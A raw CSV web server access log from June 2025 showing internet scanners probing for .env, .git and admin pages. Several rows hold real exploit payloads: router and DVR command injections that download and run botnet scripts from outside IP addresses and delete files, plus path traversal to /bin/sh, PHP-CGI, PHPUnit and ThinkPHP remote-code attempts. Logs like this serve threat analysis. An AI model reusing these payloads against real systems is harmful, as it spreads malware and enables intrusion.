ip,country,date,http_code,method,query
185.177.72.179,GB,2025-06-09,404,GET,/ui/.env
147.185.132.187,US,2025-06-09,403,GET,/
185.177.72.179,GB,2025-06-09,404,GET,/unixtime/.env
185.177.72.179,GB,2025-06-09,404,GET,/unsplash-downloader/.env
185.177.72.179,GB,2025-06-09,404,GET,/upfiles/.env
185.177.72.179,GB,2025-06-09,404,GET,/upload/.env
185.177.72.179,GB,2025-06-09,404,GET,/uploads/.env
185.177.72.179,GB,2025-06-09,404,GET,/urlmem-app/.env
185.177.72.179,GB,2025-06-09,404,GET,/User_info/.env
185.177.72.179,GB,2025-06-09,404,GET,/v1/.env
185.177.72.179,GB,2025-06-09,404,GET,/v2/.env
185.177.72.179,GB,2025-06-09,404,GET,/var/backup/.env
185.177.72.179,GB,2025-06-09,404,GET,/vendor/.env
185.177.72.179,GB,2025-06-09,404,GET,/vendor/github.com/gobuffalo/envy/.env
185.177.72.179,GB,2025-06-09,404,GET,/vendor/github.com/subosito/gotenv/.env
185.177.72.179,GB,2025-06-09,404,GET,/vendor/laravel/.env
185.177.72.179,GB,2025-06-09,404,GET,/videos/.env
185.177.72.179,GB,2025-06-09,404,GET,/vm-docker-compose/.env
185.177.72.179,GB,2025-06-09,404,GET,/vod_installer/.env
185.177.72.179,GB,2025-06-09,404,GET,/vue_CRM/.env
185.177.72.179,GB,2025-06-09,404,GET,/vue-end/vue-til/.env
185.177.72.179,GB,2025-06-09,404,GET,/vue/vuecli/.env
185.177.72.179,GB,2025-06-09,404,GET,/web-dist/.env
185.177.72.179,GB,2025-06-09,404,GET,/Web/siteMariage/.env
185.177.72.179,GB,2025-06-09,404,GET,/webroot_path/.env
185.177.72.179,GB,2025-06-09,404,GET,/websocket/.env
185.177.72.179,GB,2025-06-09,404,GET,/webstatic/.env
185.177.72.179,GB,2025-06-09,404,GET,/webui/.env
185.177.72.179,GB,2025-06-09,404,GET,/well-known/.env
185.177.72.179,GB,2025-06-09,404,GET,/whturk/.env
185.177.72.179,GB,2025-06-09,404,GET,/windows/tests/9.2.x/.env
185.177.72.179,GB,2025-06-09,404,GET,/windows/tests/9.3.x/.env
185.177.72.179,GB,2025-06-09,404,GET,/wp-content/.env
185.177.72.179,GB,2025-06-09,404,GET,/www-data/.env
185.177.72.179,GB,2025-06-09,404,GET,/www/.env
185.177.72.179,GB,2025-06-09,404,GET,/xx-final/vue-heroes/.env
185.177.72.179,GB,2025-06-09,404,GET,/zmusic-frontend/.env
78.153.140.177,GB,2025-06-09,400,GET,/.env
78.153.140.177,GB,2025-06-09,400,GET,/api/.env
78.153.140.177,GB,2025-06-09,400,GET,/backend/.env
78.153.140.177,GB,2025-06-09,400,GET,/admin/.env
78.153.140.177,GB,2025-06-09,400,GET,/.env.example
78.153.140.177,GB,2025-06-09,400,GET,/app_dev.php/_profiler/phpinfo
78.153.140.177,GB,2025-06-09,400,GET,/?phpinfo=-1
78.153.140.177,GB,2025-06-09,400,GET,/Backend/.env
78.153.140.177,GB,2025-06-09,400,GET,/Application/.env
78.153.140.177,GB,2025-06-09,400,GET,/sendgrid/.env
196.251.73.96,SC,2025-06-09,404,GET,/.env
147.182.192.164,US,2025-06-09,301,GET,/upl.php
147.182.192.164,US,2025-06-09,301,GET,/1.php
147.182.192.164,US,2025-06-09,301,GET,/systembc/password.php
147.182.192.164,US,2025-06-09,301,GET,/form.html
147.182.192.164,US,2025-06-09,301,GET,/t4
147.182.192.164,US,2025-06-09,301,GET,/geoip/
147.182.192.164,US,2025-06-09,301,GET,/favicon.ico
147.182.192.164,US,2025-06-09,301,GET,/password.php
204.76.203.206,NL,2025-06-09,301,GET,/
204.76.203.208,NL,2025-06-09,405,PROPFIND,/
204.76.203.212,NL,2025-06-09,301,GET,/
87.121.84.34,US,2025-06-09,404,GET,/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh)
196.251.84.199,NL,2025-06-09,404,GET,/.env
34.127.18.160,US,2025-06-09,405,OPTIONS,/
195.3.221.137,PL,2025-06-09,400,PUT,/SDK/webLanguage
185.189.182.234,NL,2025-06-09,400,GET,/MKoU
172.236.228.227,US,2025-06-09,403,GET,/
64.62.156.197,US,2025-06-09,403,GET,/
64.62.156.199,US,2025-06-09,404,GET,/webui/
196.251.85.74,NL,2025-06-09,404,GET,/core/.env
64.62.156.193,US,2025-06-09,403,GET,/
204.76.203.208,NL,2025-06-09,405,PROPFIND,/
196.251.72.29,SC,2025-06-09,404,GET,/.env
35.203.211.89,GB,2025-06-09,301,GET,/
35.203.211.89,GB,2025-06-09,403,GET,/
64.62.156.201,US,2025-06-09,404,GET,/geoserver/web/
64.62.156.196,US,2025-06-09,404,GET,/.git/config
204.76.203.212,NL,2025-06-09,301,GET,/
35.197.184.223,AU,2025-06-09,301,OPTIONS,/
79.124.58.198,BG,2025-06-09,403,GET,/?XDEBUG_SESSION_START=phpstorm
194.50.16.252,NL,2025-06-09,404,GET,/portalapi/actuator
194.50.16.252,NL,2025-06-09,301,GET,/portalapi/actuator
104.234.115.166,CA,2025-06-09,301,GET,/
104.234.115.166,CA,2025-06-09,301,GET,/
104.234.115.166,CA,2025-06-09,301,GET,/admin/index.html
104.234.115.166,CA,2025-06-09,301,GET,/index.html
104.234.115.166,CA,2025-06-09,301,GET,/login.htm
104.234.115.166,CA,2025-06-09,301,GET,/login.html
104.234.115.166,CA,2025-06-09,301,GET,/login
104.234.115.166,CA,2025-06-09,301,GET,/doc/index.html
104.234.115.166,CA,2025-06-09,301,GET,//webpages/login.html
104.234.115.166,CA,2025-06-09,403,GET,/
104.234.115.166,CA,2025-06-09,403,GET,/
104.234.115.166,CA,2025-06-09,404,GET,/manage/account/login
104.234.115.166,CA,2025-06-09,404,GET,/manage/account/login
104.234.115.166,CA,2025-06-09,404,GET,/admin/index.html
104.234.115.166,CA,2025-06-09,404,GET,/admin/index.html
104.234.115.166,CA,2025-06-09,404,GET,/index.html
104.234.115.166,CA,2025-06-09,404,GET,/index.html
104.234.115.166,CA,2025-06-09,404,GET,/+CSCOE+/logon.html
104.234.115.166,CA,2025-06-09,404,GET,/+CSCOE+/logon.html
104.234.115.166,CA,2025-06-09,404,GET,/cgi-bin/login.cgi
104.234.115.166,CA,2025-06-09,404,GET,/login.htm
104.234.115.166,CA,2025-06-09,404,GET,/login.htm
104.234.115.166,CA,2025-06-09,404,GET,/login.html
104.234.115.166,CA,2025-06-09,404,GET,/login.html
104.234.115.166,CA,2025-06-09,404,GET,/login.jsp
104.234.115.166,CA,2025-06-09,404,GET,/login
104.234.115.166,CA,2025-06-09,404,GET,/login
104.234.115.166,CA,2025-06-09,404,GET,/doc/index.html
104.234.115.166,CA,2025-06-09,404,GET,/doc/index.html
104.234.115.166,CA,2025-06-09,404,GET,/remote/login
104.234.115.166,CA,2025-06-09,404,GET,/remote/login
104.234.115.166,CA,2025-06-09,404,GET,//admin/login.asp
104.234.115.166,CA,2025-06-09,404,GET,//admin/login.asp
104.234.115.166,CA,2025-06-09,404,GET,/web/
104.234.115.166,CA,2025-06-09,404,GET,/web/
104.234.115.166,CA,2025-06-09,404,GET,//webpages/login.html
104.234.115.166,CA,2025-06-09,404,GET,//webpages/login.html
94.102.56.8,NL,2025-06-09,404,GET,/fapi/v1/ticker/bookTicker?symbol=BTCUSDT
194.50.16.252,NL,2025-06-09,404,GET,/portalapi/actuator
160.22.160.122,VN,2025-06-09,301,GET,/
87.121.84.208,US,2025-06-09,404,GET,/geoserver
87.121.84.208,US,2025-06-09,400,GET,/geoserver
204.76.203.208,NL,2025-06-09,405,PROPFIND,/
137.184.142.12,US,2025-06-09,200,GET,/
137.184.142.12,US,2025-06-09,404,GET,/favicon.ico
137.184.142.12,US,2025-06-09,404,GET,/ads.txt
137.184.142.12,US,2025-06-09,403,GET,/
137.184.142.12,US,2025-06-09,404,GET,/favicon.ico
137.184.142.12,US,2025-06-09,404,GET,/ads.txt
18.234.53.188,US,2025-06-09,301,GET,/
79.124.58.198,BG,2025-06-09,404,GET,/actuator/gateway/routes
204.76.203.212,NL,2025-06-09,301,GET,/
54.224.130.244,US,2025-06-09,403,GET,/
195.3.221.137,PL,2025-06-09,301,GET,/
91.231.89.205,FR,2025-06-09,403,GET,/
71.6.232.25,US,2025-06-09,301,GET,/
185.186.26.22,DE,2025-06-09,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%20%7C%7C%20cd%20%2Fvar%2Frun%20%7C%7C%20cd%20%2Fmnt%20%7C%7C%20cd%20%2Froot%20%7C%7C%20cd%20%2F%3B%20wget%20http%3A%2F%2F45.116.104.101%2Fhiroz3x.sh%3B%20curl%20-O%20http%3A%2F%2F45.116.104.101%2Fhiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%2045.116.104.101%20-c%20get%20hiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%20-r%20hiroz3x2.sh%20-g%2045.116.104.101%3B%20chmod%20777%20hiroz3x2.sh%3B%20sh%20hiroz3x2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%2045.116.104.101%20hiroz3x1.sh%20hiroz3x1.sh%3B%20sh%20hiroz3x1.sh%3B%20rm%20-rf%20hiroz3x.sh%20hiroz3x.sh%20hiroz3x2.sh%20hiroz3x1.sh%3B%20rm%20-rf%20%2A
8.155.37.27,CN,2025-06-09,301,HEAD,/admin/phpmyadmin/scripts/setup.txt
8.155.37.27,CN,2025-06-09,301,HEAD,/phpMyAdmin3/scripts/setup.php
8.155.37.27,CN,2025-06-09,301,HEAD,/admin/pma/scripts/setup.php
8.155.37.27,CN,2025-06-09,404,HEAD,/admin/pma/scripts/setup.php
8.155.37.27,CN,2025-06-09,301,HEAD,/myadmin/scripts/setup.php
8.155.37.27,CN,2025-06-09,404,HEAD,/myadmin/scripts/setup.php
8.155.37.27,CN,2025-06-09,301,HEAD,/phpMyAdmin-2.11.9.2/scripts/setup.php
43.166.136.153,US,2025-06-09,400,GET,/
198.55.98.76,US,2025-06-09,404,GET,/.git/config
204.76.203.208,NL,2025-06-09,405,PROPFIND,/
31.59.58.200,DE,2025-06-09,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.149.29.68%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
204.76.203.206,NL,2025-06-09,301,GET,/
64.227.31.165,US,2025-06-09,301,GET,/.env
64.227.31.165,US,2025-06-09,301,GET,/.git/config
91.196.152.50,FR,2025-06-09,301,GET,/
185.242.226.14,US,2025-06-09,403,GET,/
196.251.87.59,NL,2025-06-09,404,GET,/.env
91.196.152.166,FR,2025-06-09,301,GET,/favicon.ico
91.196.152.163,FR,2025-06-09,403,GET,/
188.242.7.19,RU,2025-06-09,301,GET,/
43.133.220.37,JP,2025-06-09,301,GET,/
43.133.220.37,JP,2025-06-09,403,GET,/
91.196.152.85,FR,2025-06-09,404,GET,/favicon.ico
185.194.177.120,DE,2025-06-09,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%20%7C%7C%20cd%20%2Fvar%2Frun%20%7C%7C%20cd%20%2Fmnt%20%7C%7C%20cd%20%2Froot%20%7C%7C%20cd%20%2F%3B%20wget%20http%3A%2F%2F45.116.104.101%2Fhiroz3x.sh%3B%20curl%20-O%20http%3A%2F%2F45.116.104.101%2Fhiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%2045.116.104.101%20-c%20get%20hiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%20-r%20hiroz3x2.sh%20-g%2045.116.104.101%3B%20chmod%20777%20hiroz3x2.sh%3B%20sh%20hiroz3x2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%2045.116.104.101%20hiroz3x1.sh%20hiroz3x1.sh%3B%20sh%20hiroz3x1.sh%3B%20rm%20-rf%20hiroz3x.sh%20hiroz3x.sh%20hiroz3x2.sh%20hiroz3x1.sh%3B%20rm%20-rf%20%2A
198.186.130.214,DE,2025-06-09,200,GET,/
204.76.203.212,NL,2025-06-09,301,GET,/
198.235.24.157,US,2025-06-09,403,GET,/
87.236.176.160,GB,2025-06-09,301,GET,/
87.236.176.160,GB,2025-06-09,403,GET,/
93.174.93.12,NL,2025-06-09,301,GET,/
198.235.24.157,US,2025-06-09,403,GET,/
64.62.197.4,US,2025-06-09,301,GET,/
64.62.197.15,US,2025-06-09,301,GET,/webui/
64.62.197.11,US,2025-06-09,301,GET,/
64.62.197.10,US,2025-06-09,403,GET,/
64.62.197.4,US,2025-06-09,301,GET,/favicon.ico
64.62.197.11,US,2025-06-09,301,GET,/geoserver/web/
204.76.203.206,NL,2025-06-09,301,GET,/
45.142.194.42,US,2025-06-09,404,GET,/.env
196.251.70.87,SC,2025-06-09,404,GET,/.git/HEAD
8.155.37.27,CN,2025-06-09,301,HEAD,/phpMyAdmin2/scripts/setup.php
8.155.37.27,CN,2025-06-09,404,HEAD,/phpMyAdmin2/scripts/setup.php
8.155.37.27,CN,2025-06-09,301,HEAD,/admin/scripts/setup.php
8.155.37.27,CN,2025-06-09,301,HEAD,/phpMyAdmin-2.11.9.2/scripts/setup.php
8.155.37.27,CN,2025-06-09,404,HEAD,/phpMyAdmin-2.11.9.2/scripts/setup.php
204.76.203.208,NL,2025-06-09,405,PROPFIND,/
196.251.86.80,NL,2025-06-11,404,GET,/.env
185.218.84.178,US,2025-06-11,301,GET,/
104.248.131.249,DE,2025-06-11,403,GET,/
104.248.131.249,DE,2025-06-11,404,GET,/odinhttpcall1749568263
104.248.131.249,DE,2025-06-11,404,POST,/sdk
104.248.131.249,DE,2025-06-11,404,GET,/HNAP1
104.248.131.249,DE,2025-06-11,404,GET,/evox/about
104.248.131.249,DE,2025-06-11,403,GET,/
104.248.131.249,DE,2025-06-11,403,GET,/
164.90.189.124,DE,2025-06-11,400,GET,/
164.92.160.112,DE,2025-06-11,400,GET,/v2/_catalog
206.189.60.215,DE,2025-06-11,400,GET,/query?q=SHOW+DIAGNOSTICS
164.90.233.210,DE,2025-06-11,400,GET,/solr/admin/info/system
46.101.96.95,DE,2025-06-11,400,GET,/cgi-bin/authLogin.cgi
164.90.233.210,DE,2025-06-11,400,GET,/solr/admin/cores?action=STATUS&wt=json
167.172.104.241,DE,2025-06-11,403,POST,/
164.90.189.124,DE,2025-06-11,403,GET,/
167.99.1.98,US,2025-06-11,400,SSTP_DUPLEX_POST,/sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/
185.242.226.14,US,2025-06-11,403,GET,/
115.231.78.11,CN,2025-06-11,403,GET,/
115.231.78.11,CN,2025-06-11,403,GET,/
115.231.78.11,CN,2025-06-11,404,GET,/favicon.ico
115.231.78.11,CN,2025-06-11,404,GET,/robots.txt
195.3.221.137,PL,2025-06-11,301,GET,/userRpmNatDebugRpm26525557/start_art.html
31.59.58.200,DE,2025-06-11,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.149.29.68%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
204.76.203.219,NL,2025-06-11,301,GET,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
185.194.177.120,DE,2025-06-11,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%20%7C%7C%20cd%20%2Fvar%2Frun%20%7C%7C%20cd%20%2Fmnt%20%7C%7C%20cd%20%2Froot%20%7C%7C%20cd%20%2F%3B%20wget%20http%3A%2F%2F45.116.104.101%2Fhiroz3x.sh%3B%20curl%20-O%20http%3A%2F%2F45.116.104.101%2Fhiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%2045.116.104.101%20-c%20get%20hiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%20-r%20hiroz3x2.sh%20-g%2045.116.104.101%3B%20chmod%20777%20hiroz3x2.sh%3B%20sh%20hiroz3x2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%2045.116.104.101%20hiroz3x1.sh%20hiroz3x1.sh%3B%20sh%20hiroz3x1.sh%3B%20rm%20-rf%20hiroz3x.sh%20hiroz3x.sh%20hiroz3x2.sh%20hiroz3x1.sh%3B%20rm%20-rf%20%2A
185.242.226.116,US,2025-06-11,301,GET,/
185.242.226.116,US,2025-06-11,403,GET,/
204.76.203.206,NL,2025-06-11,301,GET,/
117.48.157.75,CN,2025-06-11,400,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
117.48.157.75,CN,2025-06-11,400,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
117.48.157.75,CN,2025-06-11,404,POST,/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
117.48.157.75,CN,2025-06-11,404,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/vendor/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/vendor/phpunit/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/vendor/phpunit/phpunit/LICENSE/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/phpunit/phpunit/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/phpunit/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/lib/phpunit/phpunit/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/lib/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/lib/phpunit/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
117.48.157.75,CN,2025-06-11,404,GET,/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
117.48.157.75,CN,2025-06-11,404,GET,/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
117.48.157.75,CN,2025-06-11,404,GET,/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php
117.48.157.75,CN,2025-06-11,404,GET,/index.php?lang=../../../../../../../../tmp/index1
117.48.157.75,CN,2025-06-11,404,GET,/containers/json
204.76.203.212,NL,2025-06-11,301,GET,/
47.91.91.123,DE,2025-06-11,403,GET,/
35.240.70.70,BE,2025-06-11,301,GET,/
134.199.168.27,AU,2025-06-11,301,GET,/.git/config
134.199.168.27,AU,2025-06-11,404,GET,/.git/config
185.194.177.120,DE,2025-06-11,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%20%7C%7C%20cd%20%2Fvar%2Frun%20%7C%7C%20cd%20%2Fmnt%20%7C%7C%20cd%20%2Froot%20%7C%7C%20cd%20%2F%3B%20wget%20http%3A%2F%2F45.116.104.101%2Fhiroz3x.sh%3B%20curl%20-O%20http%3A%2F%2F45.116.104.101%2Fhiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%2045.116.104.101%20-c%20get%20hiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%20-r%20hiroz3x2.sh%20-g%2045.116.104.101%3B%20chmod%20777%20hiroz3x2.sh%3B%20sh%20hiroz3x2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%2045.116.104.101%20hiroz3x1.sh%20hiroz3x1.sh%3B%20sh%20hiroz3x1.sh%3B%20rm%20-rf%20hiroz3x.sh%20hiroz3x.sh%20hiroz3x2.sh%20hiroz3x1.sh%3B%20rm%20-rf%20%2A
51.159.23.43,FR,2025-06-11,403,GET,/
185.218.84.178,US,2025-06-11,301,GET,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
204.76.203.219,NL,2025-06-11,301,GET,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
51.159.23.43,FR,2025-06-11,403,GET,/
194.50.16.252,NL,2025-06-11,301,GET,/.git/config
194.50.16.252,NL,2025-06-11,301,GET,/api/.git/config
194.50.16.252,NL,2025-06-11,404,GET,/.git/config
194.50.16.252,NL,2025-06-11,404,GET,/api/.git/config
176.65.148.166,NL,2025-06-11,301,GET,/
79.124.8.119,NL,2025-06-11,301,GET,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
103.158.171.162,IN,2025-06-11,301,POST,/GponForm/diag_Form?images/
151.238.168.235,IR,2025-06-11,301,GET,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
45.82.78.254,DE,2025-06-11,301,GET,/
185.218.84.178,US,2025-06-11,301,GET,/
176.65.148.234,NL,2025-06-11,301,GET,/
34.38.147.151,BE,2025-06-11,403,GET,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
204.76.203.212,NL,2025-06-11,301,GET,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
31.59.58.200,DE,2025-06-11,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.149.29.68%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
146.190.49.136,US,2025-06-11,400,GET,/.git/config
146.190.49.136,US,2025-06-11,404,GET,/.env
146.190.49.136,US,2025-06-11,400,GET,/.env
146.190.49.136,US,2025-06-11,404,GET,/.git/config
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
198.55.98.76,US,2025-06-11,404,GET,/_profiler/phpinfo
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
43.130.110.130,US,2025-06-11,400,GET,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
204.76.203.206,NL,2025-06-11,301,GET,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
185.194.177.120,DE,2025-06-11,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%20%7C%7C%20cd%20%2Fvar%2Frun%20%7C%7C%20cd%20%2Fmnt%20%7C%7C%20cd%20%2Froot%20%7C%7C%20cd%20%2F%3B%20wget%20http%3A%2F%2F45.116.104.101%2Fhiroz3x.sh%3B%20curl%20-O%20http%3A%2F%2F45.116.104.101%2Fhiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%2045.116.104.101%20-c%20get%20hiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%20-r%20hiroz3x2.sh%20-g%2045.116.104.101%3B%20chmod%20777%20hiroz3x2.sh%3B%20sh%20hiroz3x2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%2045.116.104.101%20hiroz3x1.sh%20hiroz3x1.sh%3B%20sh%20hiroz3x1.sh%3B%20rm%20-rf%20hiroz3x.sh%20hiroz3x.sh%20hiroz3x2.sh%20hiroz3x1.sh%3B%20rm%20-rf%20%2A
204.76.203.208,NL,2025-06-11,405,PROPFIND,/
20.118.202.126,US,2025-06-11,400,GET,/
